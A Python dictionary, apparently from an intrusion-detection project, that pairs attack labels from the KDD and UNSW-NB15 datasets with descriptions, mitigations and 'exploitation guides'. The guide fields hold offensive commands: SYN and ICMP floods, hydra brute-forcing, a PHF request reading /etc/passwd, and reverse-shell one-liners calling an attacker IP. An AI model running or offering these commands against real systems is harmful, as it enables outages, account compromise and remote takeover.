"""
Vulnerability Information Database
Contains attack descriptions, recommendations, and exploitation guides
"""

def get_vuln_info(attack_type):
    """Get vulnerability information for attack type"""
    return vuln_info.get(attack_type, {
        "description": f"Unknown attack type: {attack_type}",
        "recommendation": "Investigate further and consult security documentation.",
        "exploitation_guide": "N/A"
    })

# Vulnerability database
vuln_info = {
    "normal": {
        "description": "No attack detected. Network traffic appears normal.",
        "recommendation": "No action required.",
        "exploitation_guide": "N/A"
    },
    "neptune": {
        "description": "SYN flood DoS attack to exhaust server resources.",
        "recommendation": "Enable SYN cookies, use firewalls, limit concurrent connections.",
        "exploitation_guide": "Use `hping3 -S <target_ip> -p <port> --flood` to initiate SYN flood."
    },
    "smurf": {
        "description": "ICMP flood amplified via broadcast addresses.",
        "recommendation": "Disable IP-directed broadcasts. Filter ICMP at network edge.",
        "exploitation_guide": "Use `hping3 --icmp -a <target_ip> <broadcast_ip>` to simulate the effect."
    },
    "guess_passwd": {
        "description": "Remote brute-force login attempts.",
        "recommendation": "Use MFA, lockout policies, monitor login attempts.",
        "exploitation_guide": "Run `hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://<target>`"
    },
    "buffer_overflow": {
        "description": "Memory overflow to execute arbitrary code.",
        "recommendation": "Use stack canaries, ASLR, DEP. Audit C/C++ code.",
        "exploitation_guide": "Identify vulnerable binary. Fuzz input to find offset using `pattern_create`."
    },
    "portsweep": {
        "description": "Port scan to identify running services.",
        "recommendation": "Use IDS/IPS, block repeated scans via rate-limiting.",
        "exploitation_guide": "Run `nmap -p- <target>` or `masscan <target> -p1-65535 --rate 10000`"
    },
    "ipsweep": {
        "description": "Sweep IPs in subnet to identify live hosts.",
        "recommendation": "Filter ICMP echo replies and monitor logs.",
        "exploitation_guide": "Execute `nmap -sn 192.168.1.0/24` or `fping -a -g 192.168.1.0/24`"
    },
    "warezclient": {
        "description": "Unauthorized download of pirated software.",
        "recommendation": "Monitor outbound FTP, restrict file types.",
        "exploitation_guide": "Connect to target FTP: `ftp <target>`. Login anonymously and download files."
    },
    "imap": {
        "description": "Brute-force or flaw exploitation in IMAP service.",
        "recommendation": "Enable strong auth and patch IMAP daemons.",
        "exploitation_guide": "Use `hydra -l user -P passwords.txt imap://<target>`"
    },
    "multihop": {
        "description": "Chaining systems to evade attribution.",
        "recommendation": "Trace network paths, inspect intermediate hops.",
        "exploitation_guide": "Compromise an exposed box and pivot using proxychains or SSH tunneling."
    },
    "rootkit": {
        "description": "Stealth malware to hide presence and maintain access.",
        "recommendation": "Run rootkit detection tools, audit kernel modules.",
        "exploitation_guide": "Deploy kernel-mode or user-mode rootkits post-exploit."
    },
    "ftp_write": {
        "description": "Unauthorized file upload via FTP.",
        "recommendation": "Disable write access for anonymous users.",
        "exploitation_guide": "Connect with `ftp <target>` and upload reverse shell `put shell.php`"
    },
    "phf": {
        "description": "RCE via vulnerable PHF CGI script.",
        "recommendation": "Disable PHF, remove legacy CGI scripts.",
        "exploitation_guide": "Send GET request: `http://target/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd`"
    },
    "spy": {
        "description": "Sniffing or surveillance of network traffic.",
        "recommendation": "Use encryption, detect promiscuous NICs.",
        "exploitation_guide": "Use `tcpdump -i <interface>` or `wireshark` in monitor mode."
    },
    "teardrop": {
        "description": "Fragmented IP packets to crash target.",
        "recommendation": "Ensure kernel patched; filter malformed packets.",
        "exploitation_guide": "Craft overlapping fragment packets using `hping3 --frag`"
    },
    "warezmaster": {
        "description": "Privileged upload of pirated content to FTP.",
        "recommendation": "Restrict admin FTP logins and log all actions.",
        "exploitation_guide": "Gain access to master FTP account, upload illegal content."
    },
    "land": {
        "description": "DoS using spoofed packet with same source/dest.",
        "recommendation": "Update TCP/IP stack, drop malformed packets.",
        "exploitation_guide": "Craft a packet with `scapy`: `IP(src=target, dst=target)/TCP(sport=port, dport=port)`"
    },
    "back": {
        "description": "Installs a backdoor for persistent access.",
        "recommendation": "Scan for abnormal services, use AV/EDR.",
        "exploitation_guide": "Deploy a reverse shell using `nc`, `msfvenom`, or `bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1`"
    },
    "loadmodule": {
        "description": "Loads rogue kernel modules to gain root.",
        "recommendation": "Disable kernel module loading in production.",
        "exploitation_guide": "Exploit vulnerable SUID binaries or kernel flaws to inject LKM."
    },
    # UNSW-NB15 dataset labels
    "Normal": {
        "description": "No malicious activity detected. Traffic appears legitimate.",
        "recommendation": "No action required.",
        "exploitation_guide": "N/A"
    },
    "Generic": {
        "description": "General malicious behavior that does not fit specific categories.",
        "recommendation": "Monitor logs closely and investigate anomalies.",
        "exploitation_guide": "Varies widely; investigate network traffic and endpoints involved."
    },
    "Exploits": {
        "description": "Attacks leveraging vulnerabilities in services or applications.",
        "recommendation": "Patch all software regularly, use intrusion prevention systems.",
        "exploitation_guide": "Use Metasploit for exploiting vulnerabilities like buffer overflows, SQL injections, or RCE."
    },
    "Fuzzers": {
        "description": "Automated attack techniques sending malformed inputs to crash systems.",
        "recommendation": "Validate all inputs, apply patches, use application firewalls.",
        "exploitation_guide": "Tools like AFL or Peach Fuzzer send crafted malformed packets."
    },
    "Analysis": {
        "description": "Activities related to probing or analyzing network configurations.",
        "recommendation": "Limit access to sensitive tools and monitor reconnaissance attempts.",
        "exploitation_guide": "Using tools like Wireshark, tcpdump, or system fingerprinting utilities."
    },
    "Backdoor": {
        "description": "Hidden methods for attackers to maintain access to compromised systems.",
        "recommendation": "Scan for unusual listening ports, use behavioral analytics.",
        "exploitation_guide": "Deploy reverse shells (`nc -e /bin/sh attacker_ip port`) or backdoor trojans."
    },
    "DoS": {
        "description": "Denial of Service attacks aimed to overwhelm resources.",
        "recommendation": "Use rate limiting, firewalls, and DDoS mitigation services.",
        "exploitation_guide": "Flood targets with SYN packets (`hping3 --flood --syn target`) or UDP floods."
    },
    "Reconnaissance": {
        "description": "Network and system scanning to gather information for later attacks.",
        "recommendation": "Monitor and restrict scanning behavior with IDS/IPS.",
        "exploitation_guide": "Use Nmap for port scanning and OS detection, `ping` sweeps for live hosts."
    },
    "Shellcode": {
        "description": "Injected malicious code designed to provide shell access.",
        "recommendation": "Use DEP, ASLR, and secure coding practices to prevent code injection.",
        "exploitation_guide": "Generate shellcode payloads using `msfvenom` and inject via buffer overflows."
    },
    "Worms": {
        "description": "Self-replicating malware spreading over networks.",
        "recommendation": "Keep systems patched, segment networks, and use antivirus.",
        "exploitation_guide": "Exploit SMB vulnerabilities (e.g., EternalBlue) or use phishing to propagate."
    }
}
